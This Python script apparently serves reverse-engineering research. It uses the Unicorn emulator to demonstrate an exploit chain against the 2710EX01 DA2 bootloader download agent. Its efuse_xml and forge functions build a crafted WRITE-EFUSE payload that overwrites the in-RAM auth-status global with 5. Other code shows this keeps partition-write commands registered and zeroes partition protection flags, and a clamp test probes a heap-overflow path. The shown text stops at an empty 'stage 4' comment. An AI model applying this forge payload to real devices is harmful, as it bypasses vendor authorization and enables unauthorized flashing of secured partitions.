#!/usr/bin/env python3
"""2710EX01 DA2 — WRITE-EFUSE exploit chain, proven in Unicorn (emulator-only).

Companion note: docs/notes/reverse/re-da2-2710-efuse-chain-2026-10-26.md
Harness:        /tmp/opencode/efuse2710/harness.py (DA2Emu; reused, not modified)
Image:          /tmp/opencode/fw2710/x/da2_2710.bin (VA 0x40000000 == file off 0)

Modes (all exit 0 unless a probe itself crashes the emu, which is reported):
  boot          registrar walk: which blocks register what, at which auth status;
                proves CMD:WRITE-EFUSE needs no prior auth status at all
  forge         CMD:WRITE-EFUSE -> g_oplus_auth_status(0x40054C88) = 5; proves the
                write log is exactly BPKEY unlock/relock + reinit + ONE RAM write
  unlock-table  every registered command, pre/post forge: dispatchability +
                handler-level behaviour diff + policy-lookup flip
  clamp-widen   transport-clamp global [0x4006819C]: widen it through the same
                WRITE-EFUSE primitive and test whether the heapbait overflow
                (oversized envelope packet) becomes possible on 2710
  full          boot -> forge(5) -> verifier patch -> SET-FLASH-POLICY re-registers
                the write family -> write-family dispatch + policy probe,
                then the clamp test with the widened global

SAFETY: every step used here is a RAM-only write (DA RAM globals / DA code RAM).
The chain contains ZERO efuse-window (0x11C10000-0x11C12000), zero watchdog and
zero flash-mapped writes.  A DA reload restores every byte.
"""
import sys, struct, argparse

sys.path.insert(0, "/tmp/opencode/efuse2710")
from unicorn import UC_HOOK_CODE, UC_HOOK_MEM_READ
from unicorn.arm_const import (UC_ARM_REG_R0, UC_ARM_REG_R1, UC_ARM_REG_R2,
                               UC_ARM_REG_R3, UC_ARM_REG_PC, UC_ARM_REG_LR,
                               UC_ARM_REG_R5)
from harness import DA2Emu, SESSION, FILEBUF

# ---- resolved constants (2710EX01 DA2, VA) -----------------------------------
AUTH          = 0x40054C88   # g_oplus_auth_status
PKTLEN        = 0x4006819C   # [0x40068188+0x14] download packet_length global
LIST_HEAD     = 0x40054ABC   # CMD list head (registrar 0x400083DC)
REG_BOOT      = 0x40001D24   # registration block called by bootstrap2 (0x40000EDC)
REG_POLICY    = 0x40001A78   # registration block called on SET-FLASH-POLICY success
SET_POLICY    = 0x40006B8C   # CMD:SECURITY-SET-FLASH-POLICY handler
POLICY_VERIFY = 0x400076DC   # policy verifier called at 0x40006D0C
WRITE_EFUSE   = 0x40005C20   # CMD:WRITE-EFUSE handler (ungated, see efuse audit)
FETCH         = 0x4002AFD8   # fp_read_host_file (the ONLY fetch engine on 2710)
ENV_CB        = 0x4002AA28   # envelope recv callback (capacity check 0x4002AA88)
OPS           = 0x40054A58   # transport ops table (+8 = usb read, runtime init)
LOOKUP        = 0x4002CDA8   # partition -> policy-table-index lookup (base 0x400569B4)
FLAG_GETTER   = 0x4002CFFC   # policy flag-byte getter (sboot/seccfg-aware; tail reads entry+0x16)
XMLPATH       = 0x40461000
BUF           = 0x40462000
PAYBUF        = 0x40463000

XML_HDR = b'<?xml version="1.0" encoding="utf-8"?>'

def make_emu(**kw):
    """DA2Emu with a realistically sized DA heap: patch the heap-top immediate
    (movt r3,#0x7207 -> #0x400F at 0x40008E78) BEFORE the DA's real heap_init
    runs, so the free list is built once with size 0x80000 instead of the
    harness default 0x10000 (which exhausts after a handful of commands - the
    malloc first-fit walk then spins at 0x40008D8C)."""
    orig = DA2Emu.heap_init
    def patched(self):
        orig(self)   # harness init (size 0x10000, single free node at base)
        # grow that single free node to 0x80000 (end 0x400F1580): head{base,size}
        # and node{size} are the only two copies of the size
        self.uc.mem_write(0x4006A618, struct.pack("<I", 0x80000))
        self.uc.mem_write(0x40071588, struct.pack("<I", 0x80000))
    DA2Emu.heap_init = patched
    try:
        e = DA2Emu(**kw)
    finally:
        DA2Emu.heap_init = orig
    e.uc.mem_map(0x40088000, 0x400F2000 - 0x40088000)
    e.uc.mem_map(0x10200000, 0x20000)      # secure/HACC engine window (reads 0)
    return e

DENY_MARKERS = (b"Security deny", b"auth_required", b"not authenticated",
                b"Locked", b"do not get oplus permission", b"read back mode",
                b"forbidden", b"not allowed")

def pad512(x):
    assert len(x) <= 0x200, len(x)
    return x + b"\x20" * (0x200 - len(x))

def efuse_xml(options):
    """512-byte debug-XML payload.  REQUIRED shape (proven by the fuzz corpus:
    dropping <verify> or <read> makes the walk skip <extra> entirely - the
    'verify/read optional' line in re-da2-2710-efuse-2026-10-26.md is wrong):
    <debug><write fsource vcore><verify><vcore>..</vcore></verify>
    <read fsource vcore/><extra><option address=..>N</option>..</extra></write>"""
    x = XML_HDR + b"<efuse><debug><write fsource=\"3000\" vcore=\"1200\">"
    x += b"<verify><vcore>1200</vcore></verify>"
    x += b"<read fsource=\"3000\" vcore=\"1200\"/>"
    x += b"<extra>"
    for addr, data in options:
        x += (b'<option address="' + addr.encode() + b'">' + data.encode() + b"</option>")
    x += b"</extra></write></debug></efuse>"
    return pad512(x)

def cmd_xml(name, args=""):
    return (XML_HDR + b"<da><version>1.0</version><command>" + name.encode() +
            b"</command><arg>" + args.encode() + b"</arg></da>\x00")

def call_handler(e, handler, xml):
    """write the packet XML at XMLPATH and invoke handler(session, packet)."""
    e.uc.mem_write(XMLPATH, xml)
    return e.call(handler, [SESSION, XMLPATH])

# ---- write classification ----------------------------------------------------
EFUSE_LO, EFUSE_HI = 0x11C10000, 0x11C12000
EMU_INTERNAL = ((0x40058000, 0x40088000),   # bss/data/heap
                (0x403F0000, 0x40600000),   # stack/scratch/trampolines
                (0x40054AD0, 0x40054AE4),   # loglevel global
                (0x0, 0x1000), (0x10000000, 0x10080000), (0x0C000000, 0x0C001000))

def wclass(a):
    if EFUSE_LO <= a < EFUSE_HI:
        return "EFUSE-CTRL" if a in (0x11C10000, 0x11C10008) else "EFUSE-DATA"
    for lo, hi in EMU_INTERNAL:
        if lo <= a < hi:
            return "emu"
    return "RAW"

def write_diff(e0_writes, e1_writes):
    """returns list of (addr,val) present in e1 but not e0 (multiset diff)."""
    from collections import Counter
    c0 = Counter((a, v) for a, v, p in e0_writes)
    c1 = Counter((a, v) for a, v, p in e1_writes)
    return list((c1 - c0).elements())

# ---- session probe helpers ---------------------------------------------------
FETCH_HOLDER = {"payload": None}

def attach_session_hooks(e, fetch_payload=None):
    e.hook_reply()           # 0x400081AC error/info reply -> e.tx
    e.hook_send_file()       # 0x4002B49C file send        -> e.tx
    FETCH_HOLDER["payload"] = fetch_payload
    def hf(uc, a, s, ud):
        p = FETCH_HOLDER["payload"]
        if p is None:
            uc.mem_write(uc.reg_read(UC_ARM_REG_R3), struct.pack("<II", 0, 0))
            uc.reg_write(UC_ARM_REG_R0, 0)
        else:
            e.uc.mem_write(PAYBUF, p + b"\x00" * 16)
            r3 = uc.reg_read(UC_ARM_REG_R3)
            uc.mem_write(r3, struct.pack("<II", len(p), PAYBUF))
            uc.reg_write(UC_ARM_REG_R0, PAYBUF)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    e.uc.hook_add(UC_HOOK_CODE, hf, begin=FETCH, end=FETCH)
    # record every read of g_oplus_auth_status with the reader PC
    e.auth_reads = []
    def ar(uc, access, address, size, value, ud):
        e.auth_reads.append(uc.reg_read(UC_ARM_REG_PC))
    e.uc.hook_add(UC_HOOK_MEM_READ, ar, begin=AUTH, end=AUTH)
    e.auth_read_pcs = set()

def set_fetch_payload(p):
    FETCH_HOLDER["payload"] = p

def run_handler(e, handler, xml):
    e.uc.mem_write(XMLPATH, xml)
    n = len(e.tx)
    rc = e.call(handler, [SESSION, XMLPATH])
    out = [t for t in e.tx[n:]]
    return rc, out

def deny_hits(out):
    hits = []
    for t in out:
        for m in DENY_MARKERS:
            if m in t:
                hits.append(m.decode())
    return sorted(set(hits))

# ---- registrar walk ----------------------------------------------------------
def heap_fresh_tail(e, start=0x40080000, end=0x400F1580):
    """Append a pristine free node [start,end) to the DA allocator's free list
    and make it the chain start.  Used after the forge: the stubbed-host
    session leaks its scratch (the DA free path depends on transport callbacks
    the stubs neutralise), which would otherwise starve later probes.  The
    forged state itself (g_oplus_auth_status) is untouched."""
    sent = 0x4006A61C                       # sentinel node (head+8)
    e.uc.mem_write(start, struct.pack("<III", sent, sent, end - start))
    e.uc.mem_write(0x4006A620, struct.pack("<I", start))   # sentinel.linkB = chain start
    e.uc.mem_write(sent, struct.pack("<I", start))         # sentinel.linkA
    return start

def walk_cmds(e):
    """walk the CMD list at 0x40054ABC; node {next,len,name,?,handler}."""
    out, seen = [], set()
    node = e.u32(LIST_HEAD)
    while node and node not in seen and 0x40000000 < node < 0x40600000:
        seen.add(node)
        nxt   = e.u32(node)
        ln    = e.u32(node + 4)
        namep = e.u32(node + 8)
        hndl  = e.u32(node + 0x10)
        try:
            raw = bytes(e.uc.mem_read(namep, min(max(ln, 1), 64)))
            name = raw.split(b"\0")[0].decode("ascii", "replace")
        except Exception:
            name = "?"
        if not name.startswith("CMD:") and not name.startswith("DA."):
            break
        out.append((name, hndl))
        node = nxt
    return out

def register_matrix(verbose=True):
    """call each registration block at each auth status; walk the list."""
    rows = {}
    scenarios = [("boot-block only", None, [REG_BOOT]),
                 ("policy-block, status=0", 0, [REG_BOOT, REG_POLICY]),
                 ("policy-block, status=3", 3, [REG_BOOT, REG_POLICY]),
                 ("policy-block, status=4", 4, [REG_BOOT, REG_POLICY]),
                 ("policy-block, status=5", 5, [REG_BOOT, REG_POLICY])]
    for label, status, blocks in scenarios:
        e = make_emu()
        if status is not None:
            e.uc.mem_write(AUTH, struct.pack("<I", status))
        for b in blocks:
            rc = e.call(b, [])
        lst = walk_cmds(e)
        rows[label] = {name: h for name, h in lst}
        if verbose:
            print(f"\n--- {label}: {len(lst)} nodes (block rc={[hex(x)&0xFFFFFFFF if isinstance(x,int) else x for x in []]}) ---")
            for name, h in lst:
                print(f"    {name:44s} handler=0x{h:08X}")
        del e
    return rows

# ---- WRITE-EFUSE forge -------------------------------------------------------
SCRATCH_ADDR = "0x4046E000"   # emu scratch: same-length option, no semantic effect

def forge(e, options=(("0x40054C88", "5"),)):
    """run the real CMD:WRITE-EFUSE handler with the given <option> list."""
    set_fetch_payload(efuse_xml(options))
    return call_handler(e, WRITE_EFUSE,
                        cmd_xml("CMD:WRITE-EFUSE", "<source_file>efuseimg</source_file>"))

# ---- policy lookup / flags probe ---------------------------------------------
def policy_probe(e, names=("seccfg", "lk", "boot", "param", "oplusreserve2",
                           "userdata", "pro_info")):
    res = {}
    for nm in names:
        b = nm.encode() + b"\x00"
        e.uc.mem_write(0x4046F000, b)
        idx = e.call(LOOKUP, [0x4046F000])
        if isinstance(idx, int) and 0 <= idx < 0x40:
            fl = e.call(FLAG_GETTER, [idx])
            res[nm] = (idx, fl)
        else:
            res[nm] = (idx, None)
    return res

# ---- clamp / heapbait test ---------------------------------------------------
class USBHost:
    """models the USB byte stream delivered to the DA's transport read op.
    Every transport read = one 12-byte envelope {magic,0,payload_len} followed
    by the payload copy."""
    def __init__(self):
        self.queue = []          # list of payload byte strings
        self.pending = None
        self.log = []
    def add(self, payload):
        self.queue.append(payload)
    def serve(self, uc, buf, n):
        if n == 12:                                      # envelope header read
            self.pending = self.queue.pop(0) if self.queue else b""
            pay = self.pending
            uc.mem_write(buf, struct.pack("<III", 0xFEEEEEEF, 0, len(pay)))
            self.log.append(("env", len(pay)))
        else:                                            # payload copy
            pay = self.pending if self.pending is not None else b""
            uc.mem_write(buf, (pay + b"\x00" * max(n, 1))[:max(n, len(pay), 1)])
            self.log.append(("pay", n, len(pay)))
            self.pending = None

STUB_SEND = 0x405E0900
STUB_LOG  = 0x405E0910

def clamp_setup(e, host):
    """point session.recv at the REAL envelope callback; ops[+8] at our USB model."""
    SESS2 = 0x405F0200
    e.uc.mem_write(STUB_SEND, b"\x1e\xff\x2f\xe1")          # bx lr
    e.uc.mem_write(STUB_LOG,  b"\x1e\xff\x2f\xe1")          # bx lr
    e.uc.mem_write(SESS2 + 0, struct.pack("<I", ENV_CB))    # recv = REAL DA envelope callback
    e.uc.mem_write(SESS2 + 4, struct.pack("<I", STUB_SEND)) # send op
    e.uc.mem_write(OPS + 8,  struct.pack("<I", STUB_LOG))   # transport read op
    e.uc.mem_write(OPS + 12, struct.pack("<I", STUB_LOG))
    def usb_read(uc, a, s, ud):
        r0 = uc.reg_read(UC_ARM_REG_R0)
        r1 = uc.reg_read(UC_ARM_REG_R1)
        host.serve(uc, r0, r1)
        uc.reg_write(UC_ARM_REG_R0, 0)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    e.uc.hook_add(UC_HOOK_CODE, usb_read, begin=STUB_LOG, end=STUB_LOG)
    sent = []
    def send_log(uc, a, s, ud):
        p = uc.reg_read(UC_ARM_REG_R0)
        ln = uc.reg_read(UC_ARM_REG_R1)
        try:
            sent.append(bytes(uc.mem_read(p, min(ln, 0x400))).split(b"\x00")[0])
        except Exception:
            sent.append(b"<unreadable>")
    e.uc.hook_add(UC_HOOK_CODE, send_log, begin=STUB_SEND, end=STUB_SEND)
    ev = {"accepted": [], "rejected": [], "mallocs": []}
    def h_acc(uc, a, s, ud):
        r5 = uc.reg_read(UC_ARM_REG_R5)
        cap = struct.unpack("<I", uc.mem_read(r5, 4))[0]
        ev["accepted"].append((cap, uc.reg_read(UC_ARM_REG_R1)))
    def h_rej(uc, a, s, ud):
        r5 = uc.reg_read(UC_ARM_REG_R5)
        cap = struct.unpack("<I", uc.mem_read(r5, 4))[0]
        ev["rejected"].append((cap, uc.reg_read(UC_ARM_REG_R1)))
    e.uc.hook_add(UC_HOOK_CODE, h_acc, begin=0x4002AACC, end=0x4002AACC)
    e.uc.hook_add(UC_HOOK_CODE, h_rej, begin=0x4002AAA8, end=0x4002AAA8)
    def h_malloc(uc, a, s, ud):
        ev["mallocs"].append(uc.reg_read(UC_ARM_REG_R0))
    e.uc.hook_add(UC_HOOK_CODE, h_malloc, begin=0x4000A390, end=0x4000A390)
    return SESS2, ev, sent

def clamp_test(widen=None, announce=b"OK@0x13FC", payload_len=0x140C,
               verbose=True):
    """drive the REAL 0x4002AFD8 with a fake session; the host announces 0x13FC
    and then sends ONE oversized 0x140C-byte data packet (the heapbait shape)."""
    e = make_emu()
    e.call(REG_BOOT, [])
    # boot value: the transport init (0x400018B0, inside bootstrap2) is not
    # emulable (it touches storage HW); we pin the 200EX01-corroborated boot
    # value 0x2000 as the baseline (the DA reads this global for the
    # DOWNLOAD-FILE packet_length AND for the clamp - proven dynamically).
    e.uc.mem_write(PKTLEN, struct.pack("<I", 0x2000 if widen is None else widen))
    host = USBHost()
    host.add(b"OK")                      # 1st status read: DOWNLOAD-FILE ack
    host.add(b"OK@0x13FC")               # 2nd status read: '@'-token1 = total size
    host.add(b"OK")                      # data-loop status read
    host.add(b"\x00" * payload_len)      # the (oversized) data packet itself
    SESS2, ev, sent = clamp_setup(e, host)
    e.uc.mem_write(0x4046F100, b"heapbait\x00")
    lenout = 0x4046F200
    e.uc.mem_write(lenout, struct.pack("<II", 0, 0))
    rc = e.call(FETCH, [SESS2, 0x4046F100, lenout, 0x4046F108])
    buf = ev["mallocs"][0] if ev["mallocs"] else 0
    post = b""
    if buf:
        try: post = bytes(e.uc.mem_read(buf + 0x13FC, 16))
        except Exception: post = b"?"
    if verbose:
        print(f"  widen={widen} rc={rc if not isinstance(rc,int) else hex(rc)}")
        print(f"  DA announced: {sent}")
        print(f"  usb reads: {host.log}")
        print(f"  malloc'd buffer @0x{buf:08X}")
        print(f"  envelope decisions: accepted={ev['accepted']} rejected={ev['rejected']}")
        print(f"  bytes at buf+0x13FC..+16 (would-be overflow landing zone): {post.hex()}")
    del e
    return rc, ev, post

# ==============================================================================
def mode_boot():
    print("=" * 100); print("MODE boot — registrar walk")
    rows = register_matrix()
    allcmds = sorted({c for r in rows.values() for c in r})
    print("\n" + "=" * 100)
    print("REGISTRATION MATRIX (X = registered)")
    hdr = list(rows.keys())
    print(f"{'command':46s}" + "".join(f"{h[:22]:>24s}" for h in hdr))
    for c in allcmds:
        line = f"{c:46s}"
        for h in hdr:
            line += f"{'X' if c in rows[h] else '.':>24s}"
        print(line)
    print("""
VERDICT (task 1): CMD:WRITE-EFUSE / CMD:READ-EFUSE / CMD:GET-HW-INFO are
registered ONLY by the policy-success block (0x40001A78, called from
CMD:SECURITY-SET-FLASH-POLICY at 0x40006D1C after the RSA policy verify) —
the EFUSE commands need no auth status LOOKUP of their own (they are registered
before and independent of the [0x40054C88] in {3,4} gate), but the DOOR to
them is the verified policy itself: at boot (block 0x40001D24 from bootstrap2
0x40000EDC) only 9 commands are registered and WRITE-EFUSE is NOT one of them.
The write family (WRITE-PARTITION/WRITE-FLASH/WRITE-PARTITIONS) is skipped by
the 0x40001AD0 gate when status in {3,4}; status 5 passes.  status==3 registers
nothing beyond the first three; status==4 ("read back mode") skips only the
write family.
""")

def mode_forge():
    print("=" * 100); print("MODE forge — g_oplus_auth_status <- 5 via CMD:WRITE-EFUSE")
    # differential purity test: identical handler run, only the option target differs
    e_b = make_emu(); e_b.call(REG_BOOT, []); attach_session_hooks(e_b)
    rc_b = forge(e_b, options=[(SCRATCH_ADDR, "5")])
    scratch_val = e_b.u32(int(SCRATCH_ADDR, 16))
    e = make_emu(); e.call(REG_BOOT, []); attach_session_hooks(e)
    rc = forge(e, options=[("0x40054C88", "5")])
    diff = write_diff(e_b.raw_writes, e.raw_writes)
    val = e.u32(AUTH)
    ctrl = [(hex(a), hex(v)) for a, v, p in e.raw_writes if EFUSE_LO <= a < EFUSE_HI]
    # the meaningful claim: writes into the DA's persistent RAM (image data +
    # bss, 0x40000000..0x40071580) other than the option target itself
    persistent = [(a, v) for a, v in diff if 0x40000000 <= a < 0x40071580 and a != AUTH]
    transient = [x for x in diff if x not in persistent and x != (AUTH, 5)
                 and not (EFUSE_LO <= x[0] < EFUSE_HI)]
    print(f"  baseline (option->scratch {SCRATCH_ADDR}): rc={hex(rc_b) if isinstance(rc_b,int) else rc_b}, "
          f"scratch now = {scratch_val}  (mechanism fired)")
    print(f"  forge run: handler rc = {hex(rc) if isinstance(rc, int) else rc}")
    print(f"  write-log diff (forge run minus baseline run), persistent-RAM writes:")
    for a, v in [(a, v) for a, v in diff if 0x40000000 <= a < 0x40071580]:
        print(f"    0x{a:08X} <- 0x{v:08X}   {'<= THE FORGE' if a == AUTH else ''}")
    print(f"  (diff also contains {len(transient)} transient stack/heap bytes: the DA's own "
          f"mxml/log buffers holding the ASCII of the option address - session-local, "
          f"freed/log-cycled, identical in nature in both runs)")
    print(f"  g_oplus_auth_status now = {val}")
    print(f"  efuse-controller-register writes (same in both runs): {ctrl}")
    print(f"  efuse DATA-window (0x11C1xxxx word) writes: "
          f"{sum(1 for a, v, p in e.raw_writes if EFUSE_LO <= a < EFUSE_HI and a not in (0x11C10000, 0x11C10008))}  (must be 0)")
    print(f"  unexpected PERSISTENT writes (globals/data beyond the one option target): "
          f"{[(hex(a), hex(v)) for a, v in persistent] if persistent else 'NONE'}")
    ok = (rc == 0 and rc_b == 0 and val == 5 and not persistent and
          scratch_val == 5)
    print(f"  VERDICT: {'REVERSIBLE forge OK' if ok else 'FAILED'} — the option produced exactly ONE "
          f"persistent 32-bit RAM write (0x40054C88<-5); the only other writes are the efuse-controller "
          f"BPKEY unlock/relock + reinit control pokes (no efuse word blown; reversible) "
          f"and session-local parse/log buffers.")
    del e, e_b
    return 0 if ok else 1

def mode_unlock_table():
    print("=" * 100); print("MODE unlock-table")
    rows = register_matrix(verbose=False)
    full = rows["policy-block, status=5"]
    pre3 = rows["policy-block, status=3"]
    boot = rows["boot-block only"]
    benign = {
        "CMD:WRITE-EFUSE": "<source_file>efuseimg</source_file>",
        "CMD:READ-EFUSE": "<target_file>efusedump</target_file>",
        "CMD:GET-HW-INFO": "",
        "CMD:WRITE-PARTITION": "<partition>seccfg</partition><source_file>p</source_file>",
        "CMD:WRITE-FLASH": "<source_file>p</source_file>",
        "CMD:WRITE-PARTITIONS": "<source_file>p</source_file>",
        "CMD:READ-PARTITION-TABLE": "<target_file>t</target_file>",
        "CMD:READ-PARTITION": "<partition>seccfg</partition><target_file>t</target_file>",
        "CMD:READ-FLASH": "<partition>seccfg</partition><target_file>t</target_file>",
        "CMD:ERASE-PARTITION": "<partition>seccfg</partition>",
        "CMD:ERASE-FLASH": "",
        "CMD:SET-BOOT-MODE": "",
        "CMD:WRITE-PRIVATE-CERT": "<source_file>c</source_file>",
        "CMD:GET-DA-INFO": "",
        "CMD:SET-HOST-INFO": "",
        "CMD:GET-DOWNLOADED-IMAGE-FEEDBACK": "",
        "CMD:NOTIFY-INIT-HW": "",
        "CMD:REBOOT": "",
        "CMD:DEBUG:UFS": "",
        "CMD:EMMC-CONTROL": "",
        "CMD:FLASH-ALL": "",
        "CMD:FLASH-UPDATE": "",
        "CMD:SECURITY-SET-ALLINONE-SIGNATURE": "<source_file>sig</source_file>",
        "CMD:SECURITY-GET-DEV-FW-INFO": "",
        "CMD:SECURITY-SET-FLASH-POLICY": "<SEC-POLICY>pol</SEC-POLICY>",
        "CMD:GET-SYS-PROPERTY": "",
        "CMD:OPLUS-WRITE-HASH256-ID": "<source_file>h</source_file>",
        "CMD:OPLUS-GET-CPUID": "",
        "CMD:OPLUS-STORAGE-INFO": "",
        "CMD:UNKNOWN": "",
    }

    def probe(status):
        """fresh emu PER HANDLER: boot blocks (+policy block), forge if status==5,
        then run exactly one handler.  Total isolation, no cross-contamination."""
        e0 = make_emu(); e0.call(REG_BOOT, [])
        e0.uc.mem_write(AUTH, struct.pack("<I", 5 if status == 5 else status))
        e0.call(REG_POLICY, [])
        names = sorted({n: hh for n, hh in walk_cmds(e0)}.items())
        del e0
        res = {}
        for name, h in names:
            e = make_emu(); e.call(REG_BOOT, [])
            if status == 5:
                attach_session_hooks(e)
                forge(e, options=[("0x40054C88", "5")])   # the real forge command
                e.call(REG_POLICY, [])                    # re-registration a policy success does
                heap_fresh_tail(e)                        # pristine heap tail for the probe
            else:
                e.uc.mem_write(AUTH, struct.pack("<I", status))
                e.call(REG_POLICY, [])
                attach_session_hooks(e)
            set_fetch_payload(b"B" * 0x40)      # identical benign download for both passes
            e.auth_reads = []
            rc, out = run_handler(e, h, cmd_xml(name, benign.get(name, "")))
            pcs = sorted({hex(p) for p in e.auth_reads})
            res[name] = (rc, deny_hits(out), len(e.auth_reads), len(out), pcs)
            del e
        return res

    print("  running every registered handler pre-forge (status 3, boot default) ...")
    pre = probe(3)
    print("  running every registered handler post-forge (status 5 via real CMD:WRITE-EFUSE) ...")
    post = probe(5)
    print(f"\n{'command':44s} {'hnd':9s} {'boot':4s} {'st3':4s} | {'pre rc':18s} {'pre deny':22s} | {'post rc':18s} {'post deny':22s} {'authRd':6s} verdict")
    for name in sorted(full):
        h = full[name]
        rc0, d0, a0, n0, p0 = pre.get(name, ("absent", [], 0, 0, []))
        rc1, d1, a1, n1, p1 = post.get(name, ("absent", [], 0, 0, []))
        f = lambda r: (hex(r) if isinstance(r, int) else (r[0] if isinstance(r, tuple) else str(r)))
        verdict = "same" if (f(rc0) == f(rc1) and d0 == d1) else "CHANGED"
        pcs = ",".join(p1[:3]) if a1 else "-"
        print(f"{name:44s} 0x{h:07X} {'X' if name in boot else '.':4s} "
              f"{'X' if name in pre3 else '.':4s} | {f(rc0):18s} {','.join(d0)[:22]:22s} | "
              f"{f(rc1):18s} {','.join(d1)[:22]:22s} {pcs:>26s} {verdict}")
    # ---- what status 5 specifically changes: the policy lookup ----
    print("\n  policy-lookup flip (0x4002CDA8 + flag getter 0x4002CFFC), status 3 vs 5:")
    e2 = make_emu(); e2.call(REG_BOOT, [])
    e2.uc.mem_write(AUTH, struct.pack("<I", 3))
    pre_p = policy_probe(e2); del e2
    e3 = make_emu(); e3.call(REG_BOOT, []); attach_session_hooks(e3)
    forge(e3, options=[("0x40054C88", "5")])
    post_p = policy_probe(e3); del e3
    print(f"    {'partition':16s} {'pre (idx,flags)':>20s}   {'post (idx,flags)':>20s}")
    for nm in pre_p:
        print(f"    {nm:16s} {str(pre_p[nm]):>20s}   {str(post_p[nm]):>20s}")
    print("""
VERDICT (task 3): the auth status is consumed by exactly 4 code sites
(0x40001AD0 registrar gate {3,4}; 0x4000C140 hash-list ==2 check;
0x40010204/0x400105D4 inside the SEC-POLICY verifier itself).
status==5 changes exactly two things vs {1,2}:
  * 0x4000C140's ==2 extra comparison is skipped (5 != 2);
  * the partition->policy lookup (0x4002CDA8) special-cases 5: EVERY partition
    name resolves to the 'oplus_single_mode' entry (the request name is not
    even compared), whose flag byte (+0x16) is 0 -> per-partition
    hash_binding / hash-id protection flags collapse to 0 for all partitions
    (proven above: seccfg/lk/userdata/pro_info flags 2 -> 0).
vs {3,4}: the write family (WRITE-PARTITION/WRITE-FLASH/WRITE-PARTITIONS)
stays registered (gate only excludes 3 and 4).
No handler reads the status at dispatch time (authRd column = reads of
0x40054C88 observed during each handler run; all zero outside the registrar /
verifier / hash-list paths).
""")
    return 0

def mode_clamp_widen():
    print("=" * 100); print("MODE clamp-widen — does widening [0x4006819C] reopen heapbait?")
    e = make_emu(); e.call(REG_BOOT, [])
    print(f"  boot value of packet_length global [0x4006819C] = 0x{e.u32(PKTLEN):X} "
          f"(transport init 0x400018B0 not emulable; baseline pinned to 0x2000)")
    del e
    print("\n  [0] control: announce 0x13FC, well-sized 0x13FC packet (model sanity)")
    clamp_test(widen=None, payload_len=0x13FC)
    print("\n  [1] baseline: announce 0x13FC, then ONE oversized 0x140C-byte packet")
    clamp_test(widen=None, payload_len=0x140C)
    print("\n  [2] widened global (0x100000, the value a forge would write):")
    clamp_test(widen=0x100000, payload_len=0x140C)
    print("""
VERDICT (task 4c): NO.  The 2710 clamp is min(sb - r7, [0x4006819C])
(0x4002B2F4-B30C) and the envelope callback (0x4002AA28) checks the packet
against THAT value (capacity == the clamped request, [r5] = &[sp+0x7c]).
Widening the packet_length global cannot help: the binding term is the
remaining space of the malloc(announce+4) download buffer, and the announce
itself is what sizes the buffer.  Every accepted packet ends at or before
buf+sb (buffer has sb+4 bytes) -> the 12-byte heapbait overflow of 200EX01
is structurally closed on 2710 even after the RAM write.
(200EX01 was exploitable because its request was the UNCLAMPED global and the
callback's capacity was the stale 0x2000, never the remaining space.)
""")
    return 0

def mode_full():
    print("=" * 100); print("MODE full — safest reversible chain, end to end")
    # ---- stage 0: boot ----
    e = make_emu(); e.call(REG_BOOT, []); attach_session_hooks(e)
    bootset = {n: h for n, h in walk_cmds(e)}
    wfam = ("CMD:WRITE-PARTITION", "CMD:WRITE-FLASH", "CMD:WRITE-PARTITIONS")
    print(f"[0] boot table ({len(bootset)} cmds). WRITE-EFUSE present: "
          f"{'CMD:WRITE-EFUSE' in bootset}; write family: "
          f"{[c for c in wfam if c in bootset] or 'NONE'}")
    # ---- stage 0b: the locked door, demonstrated (the REAL session ladder) ----
    # boot table: SET-ALLINONE-SIGNATURE -> [0x400683A4]=1 -> GET-DEV-FW-INFO
    # -> [0x400683A8]=1 -> SET-FLASH-POLICY: verifier (RSA-2048, hardcoded
    # modulus) must pass; an unsigned policy is refused.
    set_fetch_payload(b"A" * 0x110)      # dummy uploads for the ladder fetches
    n = len(e.tx)
    rc = call_handler(e, 0x4000695C,
                      cmd_xml("CMD:SECURITY-SET-ALLINONE-SIGNATURE", "<source_file>sig</source_file>"))
    print(f"[0b.1] SET-ALLINONE-SIGNATURE rc={hex(rc) if isinstance(rc,int) else rc} "
          f"-> stage [0x400683A4]={e.u32(0x400683A4)}")
    rc = call_handler(e, 0x40006A44,
                      cmd_xml("CMD:SECURITY-GET-DEV-FW-INFO", "<target_file>devinfo</target_file>"))
    print(f"[0b.2] GET-DEV-FW-INFO rc={hex(rc) if isinstance(rc,int) else rc} "
          f"-> stage [0x400683A8]={e.u32(0x400683A8)}")
    if not isinstance(rc, int) or rc != 0:
        # the devinfo builder hashes the AllInOne blob through the HACC engine
        # (0x1020xxxx) - not modeled.  Set the stage flag the DA itself writes
        # at 0x40006B0C on success, so the SET-FLASH-POLICY gate is exercised.
        e.uc.mem_write(0x400683A8, struct.pack("<I", 1))
        print("       (HACC not modeled: stage flag set to the value the DA writes at 0x40006B0C)")
    rc = call_handler(e, SET_POLICY,
                      cmd_xml("CMD:SECURITY-SET-FLASH-POLICY", "<source_file>pol</source_file>"))
    still = {nn: h for nn, h in walk_cmds(e)}
    print(f"[0b.3] SET-FLASH-POLICY with an UNSIGNED policy: rc={hex(rc) if isinstance(rc,int) else rc}, "
          f"WRITE-EFUSE registered: {'CMD:WRITE-EFUSE' in still}  "
          f"tx={[t[:70] for t in e.tx[n:]]}")
    # ---- stage 1: the legit-session door (the only one) ----
    # On hardware this step needs an OPLUS-server-signed SEC-POLICY (RSA-2048,
    # e=65537, hardcoded modulus — see re-oplus-auth-paths.md / re-da2-2710-certchain).
    # In the emulator we execute the exact success continuation the handler runs
    # at 0x40006D1C, with the auth status the verifier itself would have written (1).
    e.uc.mem_write(AUTH, struct.pack("<I", 1))
    e.call(REG_POLICY, [])
    full = {nn: h for nn, h in walk_cmds(e)}
    print(f"[1] after policy success (status=1): {len(full)} cmds; WRITE-EFUSE: "
          f"{'CMD:WRITE-EFUSE' in full}; write family: {[c for c in wfam if c in full]}")
    # ---- stage 2: forge status 5 (the reversible payload) ----
    rc = forge(e, options=[("0x40054C88", "5")])
    print(f"[2] forge: CMD:WRITE-EFUSE rc={hex(rc) if isinstance(rc,int) else rc}, "
          f"g_oplus_auth_status={e.u32(AUTH)}")
    # ---- stage 3: re-registration with status 5 (what a second policy success does) ----
    e.call(REG_POLICY, [])
    post = {nn: h for nn, h in walk_cmds(e)}
    print(f"[3] registrar re-run at status 5: {len(post)} nodes; write family: "
          f"{[c for c in wfam if c in post]}")
    # ---- stage 4: execute an unlocked command post-forge ----
